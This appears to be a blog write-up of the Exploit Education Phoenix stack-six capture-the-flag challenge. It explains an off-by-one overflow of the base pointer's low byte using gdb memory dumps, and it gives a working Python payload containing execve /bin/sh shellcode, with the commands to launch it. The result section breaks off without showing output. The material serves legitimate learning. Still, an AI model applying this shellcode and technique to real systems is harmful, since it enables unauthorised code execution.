If you're learning and writing binary exploits, I would strongly recommend you to take [Architecture 1001: x86-64 Assembly](https://p.ost2.fyi/courses/course-v1:OpenSecurityTraining2+Arch1001_x86-64_Asm+2021_v1/course/) course by `Xeno Kovah`. They cover a wide variety of learning assembly instructions which will be really helpful to understand the exploits.

If you haven't done setting-up your lab, feel free to check out my previous article on [Exploit.education lab setup](https://shivasurya.me/security/binary-exploit/reverse-engineering/friday-gems/2023/01/06/exploit-education-lab-setup.html)

### Quick Overview

Similar to Stack Five, Stack Six exercise motives are smashing the stack, overwrite base pointer `rbp` and redirect the program to execute shellcode. However, this stack six challenge revolves around [`Off-by-one overflow`](https://csl.com.co/en/off-by-one-explained/).

### Disassemble

Disassembling the code will get you overall idea behind the stack-six code, One can use `gdb ./stack-six` to start debugging it in runtime.

1. `gdb ./stack-six`
2. Type `disassemble main` to get the disassembled code (assembly)

Before taking a look at the code, if you disassembled the stack-six using gdb to view the assembly instruction, you may notice the puts, greet, strncpy and strcpy function calls with parameters. So basically when you hit `r` in gdb without breakpoint,

1. Greet with `Welcome to phoenix/stack-six, brought to you by https://exploit.education` message via Puts (aka printf) method
3. Grabs the `ExploitEducation` environment variable content
4. Invokes `greet` function with the environment variable content as `ptr` parameter
5. The greet method allocates `buffer` variable with size `128`.
6. Populates the `maxSize` variable with `ptr` variable size aka `ExploitEducation` environment variable content.
7. `maxSize` verifies and shrink itself to the size buffer (or) `ptr` whichever is smaller.
8. Copies the content of `what` variable to `buffer`.
9. Uses `strncpy` function to calculate the length of existing buffer and copies the content from `who` variable. (actual vulnerability)
10. Returns the duplicate string pointer reference to `buffer` to the main function
11. Puts method is invoked and prints the buffer content.

### Primary Goal

The primary goal of this exercise is to analyze the overflow pattern & understand the dynamics before redirecting to `shellcode` and gain code execution. The challenging part is that the maximum you get to overwrite the `rbp` register is the Least significant byte (LSB) i.e. `1 byte`. With the help of `1 byte overflow` you're betting to redirect the code flow of the program.

### Memory Allocation

<sup> *check `Trial and Error section` to learn about why address slightly differs while executing in gdb vs seperate program invoked from shell</sup>

Let's calculate the buffer memory allocation in `greet` method first before diving into the whole program memory allocation. The buffer is initially allocated with `128` bytes that includes null character. The greet message position itself with `34` bytes and the remaining goes to `who` aka environment variable (ExploitEducation) i.e 94 bytes. However, If you take closer look at strncpy method the maxSize, The maximum you could overflow is `127` i.e check in `maxSize = sizeof(buffer) - 1;`. So, you now have opportunity to overflow the stack but until Least significant byte of `$rbp`. (0x7fffffffe5b0 which holds 7fffffffe5e0).

So, the maximum one can influence `$rbp` is from `01` to `ff` i.e anywhere between `0x7fffffffe501` to `7fffffffe5ff`. Interestingly you can't afford to have `0x00` since they represent null bytes and remember string terminates are identified using `null` byte. 

### Exploit Strategy
Now, our strategy should be following,

1. Grep and Find the `shell code` memory address
2. Finding a specific memory address between `0x7fffffffe501` to `7fffffffe5ff` that points to shell code.

```shell
(gdb) grep ExploitEducation=
[+] Searching 'ExploitEducation=' in memory
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rwx
  0x7fffffffeeff - 0x7fffffffef10  →   "ExploitEducation=[...]"
```

Luckily our shell code from environment variable `ExploitEducation=` is located at `0x7fffffffef10` and expands to `0x7fffffffef10`+ 126 (decimal) based on our strategy point one. Now, our job is to figure out some address between `0x7fffffffe501` to `7fffffffe5ff`.

```shell
(gdb) x/32gx 0x7fffffffe500
0x7fffffffe500: 0x00007ffff7ffc948      0x0000000000000049
0x7fffffffe510: 0x00007fffffffe58f      0x0000000000000001
0x7fffffffe520: 0x0000000000000049      0x00007ffff7ffb300
0x7fffffffe530: 0x0000000000000000      0x0000000000400878
0x7fffffffe540: 0x000000000040079b      0x0000000000000000
0x7fffffffe550: 0x0000000000000000      0x00007ffff7db6dde
0x7fffffffe560: 0x000000000040079b      0x01e002800078001e
0x7fffffffe570: 0x0000000000000000      0x00007ffff7db6b1e
0x7fffffffe580: 0x00007ffff7ffb300      0x0a00000000000000
0x7fffffffe590: 0x00007fffffffe638      0x00007ffff7d8fe8f
0x7fffffffe5a0: 0x00007fffffffe638      0x00007fffffffe638
0x7fffffffe5b0: 0x00007fffffffe5e0      0x00000000004007e9
0x7fffffffe5c0: 0x00007fffffffe638      0x00000001ffffe648
0x7fffffffe5d0: 0x000000000040079b      0x00007fffffffef10  # <-------------- We're Lucky
0x7fffffffe5e0: 0x0000000000000001      0x00007ffff7d8fd62
0x7fffffffe5f0: 0x0000000000000000      0x00007fffffffe630
```

And we're lucky to have memory address `0x7fffffffe5d0` pointing to `0x7fffffffef10` aka environment variable `shell code`. Now, it's all matter of few seconds to connect all dots by overwriting `$rbp` base pointer LSB `0xd0` and redirecting the code flow to gain code execution. However, overwriting LSB of base pointer doesn't actually trigger the code execution. When the program execution `leave` command from `main` function, the content of `$rbp` register is used to determine the `$rsp` aka `$rbp+8` to load `$rip` (Next Instruction Pointer). So, `0x7fffffffe5d0` points to `0x000000000040079b` and `$rsp` ($rbp+8) to `0x00007fffffffef10` which eventually loads into `$rip` to execute the shell code.

### Exploit

As we know that `strncpy` function prone to stack/buffer overflow based on context, We're about to carefully plan the exploit and plant the shellcode within the environment variable and overwrite LSB of `$rbp` base pointer, `$rsp` stack pointer and redirect the program to shellcode address. Unlike real word scenario such as `ASLR - Address Layout Randomization` and other preventions in place, We now get a chance to hardcode the `buffer` address which 100% static in this environment. Let's now visit the malicious buffer construction,

<sup> *check `Trial and Error section` to learn about why address slightly differs while executing in gdb vs seperate program invoked from shell</sup>

1. Initialize the buffer with Shell code. Grab one from [shell-storm.org](https://shell-storm.org/shellcode/files/shellcode-603.html)
2. Fill the buffer with 96 characters preferably 'A' or `\x41`  
3. Finally the LSB of `$rbp` as `\xd0`.

So, here goes the exploit buffer generated with python code,

```python
buffer = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05" # length: 30
buffer += "A"*96 #length: 96 
buffer += "\xd0" #length: 1
print(buffer) #total length: 127
```

### Result

```shell
user@phoenix-amd64:~$ export ExploitEducation=$(python stack-six.py)
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-six

### Trial & Errors

I'm including this trial and error section to learn more about debugging and failures I came across while solving this problem,

1. #### Why does address differs in `GDB` vs while executing from shell?

   The answer boils down to the environment variables that are automatically being set by `gdb` such as `LINES` & `COLUMNS`. So, when the environment variables are added to the program the stack gets pushed down and thus address varies.

   - #### How do I fix this and simulate similar to real world program execution?

      1. Simply use ` set env _ /opt/phoenix/amd64/stack-six`, `unset env LINES` & `unset env COLUMNS` commands to reset environment variables in `gdb`
      2. Use mature tools like `pwntools` - [python library](https://github.com/Gallopsled/pwntools) which helps write exploits and hooks to gdb automatically upon execution.

2. #### My stack-six exploit works in `GDB` but not in terminal ?

   This is due to address padding by environment variables in `gdb`. Check Answer #1 for detailed explanation.

3. #### Where do you get the Shell Code for x86 Arch ?

   This one is actually trial and error, You can get the shellcode based on your arch (x86, x64) in [shell-storm](https://shell-storm.org/shellcode/index.html)
